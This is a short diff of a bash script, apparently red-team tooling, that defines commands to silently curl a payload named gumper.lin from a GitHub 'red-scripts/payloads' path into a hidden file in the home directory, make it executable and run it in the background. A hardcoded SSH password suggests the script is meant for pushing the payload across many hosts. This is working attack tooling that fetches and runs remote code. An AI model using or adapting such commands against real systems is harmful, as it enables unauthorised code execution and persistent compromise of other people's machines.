@@ -1,8 +1,9 @@
 #!/bin/bash
 
 USER_FILE="linux.txt"
-CURL_COMMAND="curl -s -o ~/.gumper.lin https://github.com/CyberLions/fortnite-the-video-game-parenthesis-the-town-parenthesis/raw/main/red-scripts/payloads/gumper.lin; chmod +x ~/.gumper.lin"
-EXECUTE_COMMAND="~/.gumper.lin"
+CURL_COMMAND="curl -s -o ~/.gumper.lin https://raw.githubusercontent.com/CyberLions/fortnite-the-video-game-parenthesis-the-town-parenthesis/main/red-scripts/payloads/gumper.lin; chmod +x ~/.gumper.lin"
+EXECUTE_COMMAND="~/.gumper.lin&"
+
 
 SSH_PASSWORD="Change.me123!"
 
